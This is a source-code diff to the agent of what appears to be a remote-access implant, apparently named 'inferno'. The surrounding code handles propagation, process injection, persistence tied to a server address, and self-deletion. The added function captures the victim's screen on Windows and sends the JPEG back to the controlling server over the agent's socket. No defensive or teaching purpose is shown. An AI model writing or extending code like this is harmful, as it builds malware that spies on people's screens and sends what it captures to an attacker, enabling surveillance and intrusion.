@@ -2,6 +2,9 @@
 #include "../include/entry_dylib.hpp"
 #include "../include/EntitlementScanner.hpp"
 #include "../include/MachInjector.hpp"
+#ifdef _WIN32
+#include "../include/ScreenCapture.hpp"
+#endif
 #include <iostream>
 #include <cstdio>
 #include <cstdlib>
@@ -322,6 +325,8 @@ void Agent::handleDispatching(Packet&& packet) {
         handlePropagation(std::move(packet));
     } else if (opcode == static_cast<uint16_t>(Opcode::INJECT)) {
         handleInjection(std::move(packet));
+    } else if (opcode == static_cast<uint16_t>(Opcode::SCREENSHOT_REQ)) {
+        handleScreenshot();
     }
 }
 
@@ -441,6 +446,50 @@ void Agent::handleInjection(Packet&& packet) {
         persistInjectedAgent(m_server_ip, m_server_port, target_path);
         selfDelete();
     }
+}
+
+void Agent::handleScreenshot() {
+#ifdef _WIN32
+    inferno::capture::CaptureResult result = inferno::capture::captureScreen();
+    std::vector<uint8_t> payload;
+    // status (2 bytes)
+    uint16_t status = result.success ? 0 : 1;
+    payload.push_back(static_cast<uint8_t>((status >> 8) & 0xFF));
+    payload.push_back(static_cast<uint8_t>(status & 0xFF));
+    // width (4 bytes)
+    uint32_t w = result.width;
+    payload.push_back(static_cast<uint8_t>((w >> 24) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((w >> 16) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((w >> 8) & 0xFF));
+    payload.push_back(static_cast<uint8_t>(w & 0xFF));
+    // height (4 bytes)
+    uint32_t h = result.height;
+    payload.push_back(static_cast<uint8_t>((h >> 24) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((h >> 16) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((h >> 8) & 0xFF));
+    payload.push_back(static_cast<uint8_t>(h & 0xFF));
+    // size (4 bytes)
+    uint32_t sz = static_cast<uint32_t>(result.jpeg_data.size());
+    payload.push_back(static_cast<uint8_t>((sz >> 24) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((sz >> 16) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((sz >> 8) & 0xFF));
+    payload.push_back(static_cast<uint8_t>(sz & 0xFF));
+    // JPEG data
+    payload.insert(payload.end(), result.jpeg_data.begin(), result.jpeg_data.end());
+
+    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+               std::string(payload.begin(), payload.end()));
+    m_socket.sendData(res.serialize());
+    std::cout << "[Agent] Screenshot captured (" << w << "x" << h
+              << ", " << sz << " bytes)" << std::endl;
+#else
+    std::vector<uint8_t> payload(14, 0); // status=1 (denied), w=0, h=0, sz=0
+    payload[1] = 1;
+    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+               std::string(payload.begin(), payload.end()));
+    m_socket.sendData(res.serialize());
+    std::fprintf(stderr, "[Agent] Screenshot not supported on this platform\n");
+#endif
 }
 
 #ifdef INFERNO_TESTING
